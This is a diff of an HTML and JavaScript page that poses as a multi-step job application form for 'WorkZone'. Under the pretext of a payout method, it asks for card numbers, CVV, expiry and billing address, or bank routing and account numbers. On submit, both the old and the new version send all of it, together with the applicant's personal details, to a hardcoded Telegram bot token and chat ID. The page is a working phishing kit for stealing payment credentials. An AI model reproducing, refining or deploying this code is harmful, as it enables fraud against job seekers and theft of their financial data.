@@ -24,87 +24,77 @@
       text-align: center;
       margin-bottom: 1rem;
       color: #007bff;
-      font-size: 1.7rem;
     }
     label {
-      margin-top: 1.2rem;
+      margin-top: 1rem;
       font-weight: 600;
-      font-size: 1rem;
+      font-size: 0.95rem;
       display: block;
       color: #2d3a4e;
     }
     input, select {
       width: 100%;
-      padding: 13px 14px;
+      padding: 11px 12px;
       margin-top: 6px;
-      border-radius: 10px;
+      border-radius: 8px;
       border: 1.8px solid #c3c3c3;
-      font-size: 1.05rem;
+      font-size: 1rem;
       font-weight: 400;
       transition: border-color 0.3s ease;
     }
     input:focus, select:focus {
       outline: none;
       border-color: #007bff;
-      box-shadow: 0 0 10px rgba(0,123,255,0.3);
+      box-shadow: 0 0 8px rgba(0,123,255,0.3);
     }
     .btn {
-      margin-top: 2.5rem;
+      margin-top: 2rem;
       width: 100%;
-      padding: 16px;
-      font-size: 1.2rem;
+      padding: 14px;
+      font-size: 1.15rem;
       background: #007bff;
       color: white;
       border: none;
-      border-radius: 60px;
+      border-radius: 50px;
       cursor: pointer;
       font-weight: 700;
       transition: background-color 0.3s ease;
-      box-shadow: 0 6px 14px rgba(0,123,255,0.35);
     }
     .btn:hover {
       background: #0056b3;
-      box-shadow: 0 8px 20px rgba(0,86,179,0.5);
     }
     .toggle {
       display: flex;
-      margin-top: 1.8rem;
+      margin-top: 1.5rem;
       background: #e4e9f2;
-      border-radius: 60px;
+      border-radius: 50px;
       overflow: hidden;
       user-select: none;
-      box-shadow: inset 0 0 8px #c7cee3;
-      max-width: 520px;
-      margin-left: auto;
-      margin-right: auto;
+      box-shadow: inset 0 0 5px #c7cee3;
     }
     .toggle div {
       flex: 1;
       text-align: center;
-      padding: 15px 0;
+      padding: 12px 0;
       cursor: pointer;
       font-weight: 700;
       color: #007bff;
-      font-size: 1.1rem;
       transition: background-color 0.3s ease, color 0.3s ease;
-      user-select: none;
     }
     .toggle .active {
       background: #007bff;
       color: white;
-      box-shadow: 0 0 15px rgba(0,123,255,0.7);
     }
     .step {
       display: none;
       flex-direction: column;
       max-width: 520px;
       background: white;
-      padding: 2.5rem 3rem;
-      border-radius: 20px;
-      box-shadow: 0 14px 38px rgba(0,0,0,0.12);
+      padding: 2rem 2.5rem;
+      border-radius: 16px;
+      box-shadow: 0 10px 28px rgba(0,0,0,0.15);
       width: 100%;
       color: #2d3a4e;
-      margin-top: 1.5rem;
     }
     .step.active {
       display: flex;
@@ -112,46 +102,23 @@
     .thankyou {
       font-weight: 700;
       text-align: center;
-      font-size: 1.5rem;
+      font-size: 1.4rem;
       color: #007bff;
-      padding: 3.5rem 1rem;
+      padding: 3rem 1rem;
     }
     .back-link {
+      margin-top: 1rem;
       color: #007bff;
       cursor: pointer;
       text-decoration: underline;
       font-weight: 600;
       text-align: center;
+      display: block;
       max-width: 520px;
-      margin-bottom: 1rem;
-      user-select: none;
-    }
-    /* Card icon inside input */
-    .card-input-wrapper {
-      position: relative;
-      margin-top: 6px;
-    }
-    #cardNumber {
-      padding-right: 50px;
-    }
-    #cardTypeIcon {
-      position: absolute;
-      top: 50%;
-      right: 14px;
-      transform: translateY(-50%);
-      width: 40px;
-      height: 28px;
-      background-repeat: no-repeat;
-      background-size: contain;
-      pointer-events: none;
-      filter: drop-shadow(0 0 1px rgba(0,0,0,0.2));
     }
     @media (max-width: 600px) {
       h2 {
         font-size: 1.4rem;
-      }
-      .step {
-        padding: 2rem 1.8rem;
       }
     }
   </style>
@@ -173,12 +140,9 @@
       <select id="education" name="education" required>
         <option value="">Select...</option>
         <option>High School</option>
-        <option>GED</option>
         <option>Associate</option>
         <option>Bachelor</option>
         <option>Graduate</option>
-        <option>Doctorate</option>
-        <option>Other</option>
       </select>
       <label for="industry">Industry *</label>
       <select id="industry" name="industry" required>
@@ -187,14 +151,6 @@
         <option>Technology</option>
         <option>Healthcare</option>
         <option>Administration</option>
-        <option>Finance</option>
-        <option>Education</option>
-        <option>Manufacturing</option>
-        <option>Transportation</option>
-        <option>Hospitality</option>
-        <option>Construction</option>
-        <option>Arts & Entertainment</option>
-        <option>Other</option>
       </select>
       <button type="button" class="btn" onclick="nextStep(2)">Next</button>
     </div>
@@ -206,14 +162,11 @@
         <div id="toggle-card" role="tab" aria-selected="true" tabindex="0" class="active" onclick="togglePayout('card')" onkeydown="if(event.key==='Enter')togglePayout('card')">💳 Card</div>
         <div id="toggle-bank" role="tab" aria-selected="false" tabindex="0" onclick="togglePayout('bank')" onkeydown="if(event.key==='Enter')togglePayout('bank')">🏦 Bank</div>
       </div>
-      <div id="card-form" role="tabpanel" aria-hidden="false">
+      <div id="card-form" role="tabpanel">
         <label for="cardName">Name on Card *</label>
         <input id="cardName" name="cardName" required autocomplete="cc-name" />
         <label for="cardNumber">Card Number *</label>
-        <div class="card-input-wrapper">
-          <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" pattern="\\d{13,19}" title="Enter a valid card number" placeholder="Card Number" />
-          <div id="cardTypeIcon"></div>
-        </div>
+        <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" pattern="\\d{13,19}" title="Enter a valid card number"/>
         <label for="expiry">Expiry (MM/YY) *</label>
         <input id="expiry" name="expiry" required autocomplete="cc-exp" pattern="^(0[1-9]|1[0-2])\\/\\d{2}$" title="Format MM/YY" />
         <label for="cvv">CVV *</label>
@@ -227,7 +180,7 @@
         <label for="billingZip">ZIP Code *</label>
         <input id="billingZip" name="billingZip" pattern="\\d{5}" title="5-digit ZIP code" required autocomplete="postal-code" />
       </div>
-      <div id="bank-form" role="tabpanel" aria-hidden="true" hidden>
+      <div id="bank-form" role="tabpanel" hidden>
         <label for="bankName">Bank Name *</label>
         <input id="bankName" name="bankName" autocomplete="organization" />
         <label for="routingNumber">Routing Number *</label>
@@ -246,9 +199,7 @@
     <!-- Step 3 -->
     <div class="step" id="step-3">
       <h2>Step 3: Confirm & Submit</h2>
-      <p style="text-align:center; font-size:1rem; color:#555;">
-        We will email you with onboarding instructions once you submit.
-      </p>
+      <p>We will email you with onboarding instructions once you submit.</p>
       <button type="submit" class="btn">Submit Application</button>
     </div>
 
@@ -264,34 +215,8 @@
     const bankForm = document.getElementById('bank-form');
     const toggleCard = document.getElementById('toggle-card');
     const toggleBank = document.getElementById('toggle-bank');
-    const cardTypeIcon = document.getElementById('cardTypeIcon');
-    const cardNumberInput = document.getElementById('cardNumber');
-
-    function validateStep(stepNumber) {
-      const step = document.getElementById('step-' + stepNumber);
-      const inputs = step.querySelectorAll('input, select');
-
-      for (const input of inputs) {
-        input.setCustomValidity('');
-
-        if (!input.checkValidity()) {
-          input.reportValidity();
-          input.focus();
-          return false;
-        }
-        if (input.tagName.toLowerCase() === 'select' && input.value === '') {
-          input.setCustomValidity('Please select an option.');
-          input.reportValidity();
-          input.focus();
-          input.setCustomValidity('');
-          return false;
-        }
-      }
-      return true;
-    }
 
     function nextStep(n) {
-      if (!validateStep(n - 1)) return;
       steps.forEach(s => s.classList.remove('active'));
       document.getElementById('step-' + n).classList.add('active');
       window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -301,139 +226,71 @@
       if(type === 'card') {
         cardForm.hidden = false;
         bankForm.hidden = true;
-        cardForm.setAttribute('aria-hidden', 'false');
-        bankForm.setAttribute('aria-hidden', 'true');
         toggleCard.classList.add('active');
         toggleBank.classList.remove('active');
         toggleCard.setAttribute('aria-selected', 'true');
         toggleBank.setAttribute('aria-selected', 'false');
 
+        // Make card inputs required, bank inputs not required
         [...cardForm.querySelectorAll('input')].forEach(i => i.required = true);
         [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = false);
       } else {
         cardForm.hidden = true;
         bankForm.hidden = false;
-        cardForm.setAttribute('aria-hidden', 'true');
-        bankForm.setAttribute('aria-hidden', 'false');
         toggleCard.classList.remove('active');
         toggleBank.classList.add('active');
         toggleCard.setAttribute('aria-selected', 'false');
         toggleBank.setAttribute('aria-selected', 'true');
 
+        // Make bank inputs required, card inputs not required
         [...cardForm.querySelectorAll('input')].forEach(i => i.required = false);
         [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = true);
       }
     }
 
-    function escapeMarkdown(text) {
-      return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
-    }
-
-    function detectCardType(number) {
-      const val = number.replace(/\D/g, '');
-      if (/^4/.test(val)) return 'visa';
-      if (/^5[1-5]/.test(val)) return 'mastercard';
-      if (/^3[47]/.test(val)) return 'amex';
-      if (/^6(?:011|5)/.test(val)) return 'discover';
-      if (/^(2131|1800|35)/.test(val)) return 'jcb';
-      return 'unknown';
-    }
-
-    function updateCardIcon(type) {
-      let url = '';
-      switch(type) {
-        case 'visa':
-          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/visa.svg';
-          break;
-        case 'mastercard':
-          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/mastercard.svg';
-          break;
-        case 'amex':
-          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/amex.svg';
-          break;
-        case 'discover':
-          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/discover.svg';
-          break;
-        case 'jcb':
-          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/jcb.svg';
-          break;
-        default:
-          url = '';
-      }
-      if(url) {
-        cardTypeIcon.style.backgroundImage = `url("${url}")`;
-      } else {
-        cardTypeIcon.style.backgroundImage = '';
-      }
-    }
-
-    cardNumberInput.addEventListener('input', () => {
-      const type = detectCardType(cardNumberInput.value);
-      updateCardIcon(type);
-    });
-
     document.getElementById('jobForm').addEventListener('submit', function(e) {
       e.preventDefault();
       const form = this;
 
-      const currentStep = [...steps].findIndex(s => s.classList.contains('active'));
-      if (!validateStep(currentStep + 1)) return;
+      // Validate inputs in the visible step only:
+      const currentStep = [...steps].find(s => s.classList.contains('active'));
+      if (!currentStep) return;
 
-      // Gather data
-      const data = {
-        name: form.name.value.trim(),
-        email: form.email.value.trim(),
-        phone: form.phone.value.trim(),
-        education: form.education.value,
-        industry: form.industry.value,
-      };
-
-      if (!cardForm.hidden) {
-        data.payoutMethod = 'card';
-        data.cardName = form.cardName.value.trim();
-        data.cardNumber = form.cardNumber.value.trim();
-        data.expiry = form.expiry.value.trim();
-        data.cvv = form.cvv.value.trim();
-        data.billingAddress = form.billingAddress.value.trim();
-        data.billingCity = form.billingCity.value.trim();
-        data.billingState = form.billingState.value.trim();
-        data.billingZip = form.billingZip.value.trim();
-      } else {
-        data.payoutMethod = 'bank';
-        data.bankName = form.bankName.value.trim();
-        data.routingNumber = form.routingNumber.value.trim();
-        data.accountNumber = form.accountNumber.value.trim();
-        data.accountType = form.accountType.value;
-      }
-
-      // Format message to Telegram
-      let msg = `📢 *New Job Application*\n\n*Personal Info:*\n- Name: ${escapeMarkdown(data.name)}\n- Email: ${escapeMarkdown(data.email)}\n- Phone: ${escapeMarkdown(data.phone)}\n- Education: ${escapeMarkdown(data.education)}\n- Industry: ${escapeMarkdown(data.industry)}\n\n*Payout Method:* ${data.payoutMethod.toUpperCase()}\n`;
-
-      if(data.payoutMethod === 'card') {
-        msg += `- Name on Card: ${escapeMarkdown(data.cardName)}\n- Card Number: ${escapeMarkdown(data.cardNumber)}\n- Expiry: ${escapeMarkdown(data.expiry)}\n- CVV: ${escapeMarkdown(data.cvv)}\n- Billing Address: ${escapeMarkdown(data.billingAddress)}\n- City: ${escapeMarkdown(data.billingCity)}\n- State: ${escapeMarkdown(data.billingState)}\n- ZIP: ${escapeMarkdown(data.billingZip)}\n`;
-      } else {
-        msg += `- Bank Name: ${escapeMarkdown(data.bankName)}\n- Routing Number: ${escapeMarkdown(data.routingNumber)}\n- Account Number: ${escapeMarkdown(data.accountNumber)}\n- Account Type: ${escapeMarkdown(data.accountType)}\n`;
-      }
-
-      const token = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
-      const chatId = '1318100118';
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'MarkdownV2' }),
-      }).then(res => {
-        if (res.ok) {
-          steps.forEach(s => s.classList.remove('active'));
-          document.getElementById('step-thanks').classList.add('active');
-          form.reset();
-          cardTypeIcon.style.backgroundImage = '';
-        } else {
-          alert('Submission failed, please try again.');
+      // Check validity of visible inputs/selects only
+      const inputsToCheck = currentStep.querySelectorAll('input, select');
+      for (const input of inputsToCheck) {
+        if (!input.checkValidity()) {
+          input.reportValidity();
+          input.focus();
+          return;
         }
-      }).catch(() => alert('Network error, try again later.'));
+      }
+
+      // Only submit if on the last step (step-3)
+      if (currentStep.id !== 'step-3') {
+        alert('Please proceed to the last step before submitting.');
+        return;
+      }
+
+      // Collect all form data (including hidden inputs)
+      const data = Object.fromEntries(new FormData(form));
+      const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
+      const CHAT_ID = '1318100118';
+      let msg = '*📥 New WorkZone Application*%0A';
+      for (let k in data) {
+        msg += `*${k}*: ${data[k]}%0A`;
+      }
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+      });
+      nextStep('thanks');
+      form.reset();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     });
 
-    // Initialize default payout toggle state
+    // Initialize required attributes on load for card payout as default
     togglePayout('card');
   </script>
 </body>
